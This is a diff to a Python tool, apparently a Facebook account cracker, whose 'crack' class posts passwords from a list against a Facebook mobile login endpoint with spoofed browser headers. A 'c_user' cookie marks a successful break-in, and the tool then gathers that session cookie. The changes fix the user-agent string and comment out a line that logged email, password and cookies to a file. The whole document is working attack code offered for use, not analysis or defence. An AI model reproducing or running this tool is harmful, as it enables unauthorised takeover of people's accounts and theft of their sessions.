@@ -314,22 +314,15 @@ class crack:
     def main(self, total, email, password):
         try:
             for pws in password:
-                ua = random.choice(ugen)
-                ua2 = random.choice(ugen2)
+                self.useragent = self.realme_useragent(total = 1)
                 with requests.Session() as r:
-                    try:
-                        tix = time.time()
-                        ses.headers.update({"Host":"mbasic.facebook.com","upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
-                    except requests.exceptions.ConnectionError:
-                        time.sleep(31)
-                        loop+=1
                     r.headers.update({
 			    'host': 'mbasic.facebook.com',
 			    'cache-control': 'max-age=0',
 			    'upgrade-insecure-requests': '1',
 			    'origin': 'https://mbasic.facebook.com',
 			    'content-type': 'application/x-www-form-urlencoded',
-			    'user-agent': ua,
+			    'user-agent': self.useragent,
 			    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
 			    'sec-fetch-site': 'same-origin',
 			    'sec-fetch-mode': 'cors',
@@ -385,7 +378,7 @@ class crack:
                         'content-length': str(len(("&").join([ "%s=%s" % (x, y) for x, y in data.items() ])))
                     })
                     response2 = r.post('https://m.alpha.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100', data = data, allow_redirects = True)
-                    open('Response.txt', 'a+').write(f'{email}|{pws}|{r.cookies.get_dict()}\n')
+                    #open('Response.txt', 'a+').write(f'{email}|{pws}|{r.cookies.get_dict()}\n')
                     if 'c_user' in r.cookies.get_dict().keys():
                         try:
                             self.cookie = (";".join([str(x)+"="+str(y) for x,y in r.cookies.get_dict().items()]))
@@ -416,7 +409,7 @@ class crack:
     ### REALME USERAGENT ###
     def realme_useragent(self, total):
         for _ in range(total):
-            self.useragent = open('ua.txt', 'r').read()
+            self.useragent = ('Mozilla/5.0 (Linux; Android 12; M2010J19SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36')
         return self.useragent
 
 def uap():
